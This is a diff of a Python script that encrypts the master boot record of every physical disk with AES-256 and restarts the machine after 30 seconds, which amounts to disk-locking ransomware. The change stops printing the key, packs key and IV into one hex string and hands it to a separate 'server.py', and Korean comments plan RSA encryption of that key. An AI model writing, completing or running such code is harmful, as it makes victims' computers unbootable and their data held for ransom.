@@ -3,10 +3,11 @@ from os import urandom  # urandom: random number generator (by windows operating
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # Cipher: encryption and decryption class, algorithms: encryption and decryption algorithms for cipher object, modes: CBC, CTR...
 from cryptography.hazmat.backends import default_backend
 import subprocess
+import base64
 
-# flow chart: search physical disk -> create AES key & IV -> read sector 0 (MBR) -> encrypt sector 0 (MBR) -> (30 seconds) -> restart
+# 무차별 대입 공격
 
-# Function: search physical sdisk
+# Function: search physical disk
 def search_disk():
     disk_count = 0
     while True:
@@ -60,13 +61,15 @@ if __name__ == '__main__':
         print("No physical disks found.")
         wait_in_cmd(30)  # wait 30 seconds (cmd)
     else:
-        key = urandom(32)  # AES-256 key value (32-Byte)
-        IV = urandom(16)  # AES-256 IV value (16-Byte)
+        key = urandom(32)  # AES-256 key value (32-Byte) (Byte type: useing Cipher)
+        IV = urandom(16)  # AES-256 IV value (16-Byte) (Byte type: useing Cipher)
+        oneKey = (key + IV).hex()  # AES-256 combine key value (48-Byte), type conversion: Byte type to hex string (use "subprocess")
+        
+        # RSA 공개키로 oneKey 암호화
 
-        print("Key:", ''.join(f"{b:02X}" for b in key))  # print each Byte of key value to Hex 
-        print("IV:", ''.join(f"{b:02X}" for b in IV))  # print each Byte of IV value to Hex 
+        subprocess.run(['python3', 'server.py', oneKey])  # call script "server.py"
 
-        print(f"Number of physical disks found: {disk_count}")
+        # print(f"Number of physical disks found: {disk_count}")
         for disk_number in range(disk_count):
             read_encrypt_write_disk(disk_number, key, IV)  # function call: read_encrypt_write_disk()
         wait_in_cmd(30)  # wait 30 seconds (cmd)
